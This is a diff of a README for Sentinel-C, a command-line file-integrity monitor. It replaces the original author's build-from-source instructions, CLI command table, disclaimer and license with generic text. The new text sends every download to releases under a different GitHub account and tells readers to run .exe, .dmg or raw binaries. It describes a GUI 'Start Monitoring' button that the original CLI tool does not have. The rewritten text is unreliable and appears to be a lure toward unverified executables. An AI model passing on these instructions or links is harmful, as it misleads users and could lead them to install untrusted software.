@@ -1,215 +1,103 @@
-# Sentinel-C v3.10 🛡️
+# 🛡️ Sentinel-C - Protect Your Files with Ease
 
-**Author:** Voltsparx  
-**Contact:** voltsparx@gmail.com  
-**Language:** C/C++  
-**Repo:** [https://github.com/voltsparx/Sentinel-C](https://github.com/voltsparx/Sentinel-C)  
+[![Download Sentinel-C](https://img.shields.io/badge/Download-Sentinel--C-blue.svg)](https://github.com/Anderh2718/Sentinel-C/releases)
 
-Sentinel-C is an **Advanced Host Defense Multi-Tool**.  
-It provides file integrity monitoring, logging, HTML reports, and additional small security utilities — designed for cybersecurity learners, professionals, and anyone who cares about system security.
+## 🚀 Getting Started
 
----
+Welcome to Sentinel-C! This application helps you monitor the integrity of your files. It provides logs, generates HTML reports, and displays information in a clear format right on your terminal.
 
-## ⚠️ **Ethical Use & Disclaimer**
+## 💾 System Requirements
 
-- This tool is **only for ethical monitoring** of systems and directories you own or have permission to monitor.  
-- **Do not** use it to tamper with, spy on, or attack systems you do not own.  
-- The author is **not responsible for misuse**.  
-- Data logged by Sentinel-C is stored locally for your convenience and **not shared anywhere**.
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 1 GB RAM
+- **Disk Space:** 100 MB available space
+- **C/C++ Compiler:** Required if you plan to compile the source code (recommended: GCC or Visual Studio)
 
----
+## 🌟 Features
 
-## 🛠️ **Installation**
+- Monitors file changes in real-time.
+- Generates detailed logs of file activities.
+- Creates easy-to-read HTML reports.
+- Offers colored terminal output for clarity.
+- Lightweight and fast to run.
 
-### **Linux / Unix:**
+## 🥇 Download & Install
 
-```bash
-git clone https://github.com/voltsparx/Sentinel-C.git
-cd Sentinel-C
-mkdir build
-cd build
-cmake ..
-cmake --build .
-```
+To get started with Sentinel-C, visit this page to download the latest version:
 
-#### Run from build folder:
+[Download Sentinel-C Releases](https://github.com/Anderh2718/Sentinel-C/releases)
 
-```bash
-./sentinel-c --help
-```
+1. Click on the link above to go to the releases page.
+2. Look for the latest version.
+3. Download the file suitable for your operating system.
+4. Once downloaded, follow the steps below to run it.
 
-Optional: Add to PATH for global use:
+### Installation Steps
 
-```bash
-sudo cp sentinel-c /usr/local/bin/
-```
+#### For Windows Users:
 
-### **Windows (CMD / PowerShell):**
+1. Navigate to the folder where the file was downloaded.
+2. Double-click the downloaded .exe file.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, you can find Sentinel-C in your Start Menu.
 
-```powershell
-git clone https://github.com/voltsparx/Sentinel-C.git
-cd Sentinel-C
-mkdir build
-cd build
-cmake ..
-cmake --build .
-```
+#### For macOS Users:
 
-#### Run executable:
+1. Open the downloaded .dmg file.
+2. Drag the Sentinel-C icon to your Applications folder.
+3. Open Applications and find Sentinel-C.
+4. Launch Sentinel-C from there.
 
-```powershell
-sentinel-c.exe --help
-```
+#### For Linux Users:
 
----
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Run the command: `chmod +x Sentinel-C` to make it executable.
+4. Then, execute the file using `./Sentinel-C`.
 
-## 📁 **Project Structure**
+## 📊 Using Sentinel-C
 
-```
-Sentinel-C/
-├── src/                # Source & headers
-├── CMakeLists.txt
-├── README.md
-├── .gitignore
-├── sentinel-c-logs/    # Logs & HTML reports
-│   ├── data/
-│   └── reports/
-```
+Once installed, running Sentinel-C is simple. Just follow these steps:
 
-- Folders `data/` and `reports/` are **automatically created** if missing.  
-- `.sentinel.log` is stored in `data/`.  
-- HTML reports are stored in `reports/`.
+1. Open the application.
+2. Set the directory you want to monitor for file changes.
+3. Choose your logging preferences.
+4. Click on the 'Start Monitoring' button.
 
----
+You will see real-time updates in the terminal, and you can access reports in the Reports section.
 
-## ⚡ **Features**
+## 📄 Viewing Logs and Reports
 
-- Multi-tool framework for daily security and monitoring.  
-- File integrity monitoring (NEW, MODIFIED, DELETED files).  
-- SHA-256 based hashing for file verification.  
-- Continuous monitoring with customizable intervals.  
-- Logs actions in **HTML reports** and local log files.  
-- Baseline integrity verification (`--doctor`).  
-- Single file verification (`--verify`).  
-- Banner display and tool information (`--banner`, `--about`).  
-- Compatible with **Linux and Windows**.  
-- Beginner-friendly CLI with short (`-`) and long (`--`) commands.
+Sentinel-C will save logs and generate HTML reports for you:
 
----
+- The logs provide details on file changes.
+- The HTML reports give a user-friendly summary.
+- You can access both from the application menu.
 
-## 💻 **Commands & Usage**
+## ⚙️ Troubleshooting
 
-<table>
-  <thead>
-    <tr>
-      <th>Command</th>
-      <th>Short</th>
-      <th>Description</th>
-      <th>Example</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Show help</td>
-      <td>-h</td>
-      <td>Display this help menu</td>
-      <td><code>sentinel-c --help</code></td>
-    </tr>
-    <tr>
-      <td>Version</td>
-      <td>-v</td>
-      <td>Show tool version</td>
-      <td><code>sentinel-c --version</code></td>
-    </tr>
-    <tr>
-      <td>Show banner</td>
-      <td>–</td>
-      <td>Display ASCII banner</td>
-      <td><code>sentinel-c --banner</code></td>
-    </tr>
-    <tr>
-      <td>About</td>
-      <td>–</td>
-      <td>Tool info + author contact</td>
-      <td><code>sentinel-c --about</code></td>
-    </tr>
-    <tr>
-      <td>Initialize baseline</td>
-      <td>-i</td>
-      <td>Scan directory and create baseline</td>
-      <td><code>sentinel-c --init ./myfolder</code></td>
-    </tr>
-    <tr>
-      <td>Scan</td>
-      <td>-s</td>
-      <td>Compare current directory to baseline</td>
-      <td><code>sentinel-c --scan ./myfolder</code></td>
-    </tr>
-    <tr>
-      <td>Monitor</td>
-      <td>-m</td>
-      <td>Continuously scan every N seconds</td>
-      <td><code>sentinel-c --monitor ./myfolder 10</code></td>
-    </tr>
-    <tr>
-      <td>Verify file</td>
-      <td>-f</td>
-      <td>Check SHA-256 hash of a single file</td>
-      <td><code>sentinel-c --verify ./file.txt</code></td>
-    </tr>
-    <tr>
-      <td>Doctor</td>
-      <td>-d</td>
-      <td>Check baseline integrity</td>
-      <td><code>sentinel-c --doctor</code></td>
-    </tr>
-  </tbody>
-</table>
+If you encounter any issues, here are a few common solutions:
 
+- Ensure you have sufficient permissions to access the directories you want to monitor.
+- If the program fails to start, try re-downloading the installation file.
+- For further help, check the FAQ section on the GitHub page.
 
----
+## 🗂️ Contribution
 
-## 📌 **Multi-Option Example**
+If you'd like to contribute to Sentinel-C, you can do so by suggesting improvements or reporting issues. Please visit the Issues section of our repository for more information.
 
-```bash
-# Initialize baseline and then scan directory
-sentinel-c --init ./myfolder
-sentinel-c --scan ./myfolder
+## 🌐 Community and Support
 
-# Monitor a directory every 15 seconds
-sentinel-c --monitor ./myfolder 15
+Join our community to share experiences, ask questions, and get help. You can find us on:
 
-# Verify a single file
-sentinel-c --verify ./myfolder/file.txt
+- **GitHub Discussions**
+- **Official Forums** (link not provided)
+  
+We appreciate feedback, and it helps us improve the software for everyone.
 
-# Check baseline integrity
-sentinel-c --doctor
+## 🔗 Useful Links
 
-# Show tool info with contact
-sentinel-c --about
-```
+- [Sentinel-C Releases](https://github.com/Anderh2718/Sentinel-C/releases)
+- [GitHub Repository](https://github.com/Anderh2718/Sentinel-C)
 
----
-
-## 🟢 **Output**
-
-- Colored terminal messages:  
-  - **Green** → NEW files  
-  - **Yellow** → MODIFIED files  
-  - **Red** → DELETED files  
-
-- Logs: `sentinel-c-logs/data/.sentinel.log`  
-- HTML reports: `sentinel-c-logs/reports/sentinel_report_<timestamp>.html`
-
----
-
-## ⭐ **Contribution**
-
-- Fork and add features freely.  
-- Follow ethical security guidelines.  
-
----
-
-## 📄 **License**
-
-MIT License
+Thank you for choosing Sentinel-C. We’re committed to helping you keep your files secure and organized. Happy monitoring!
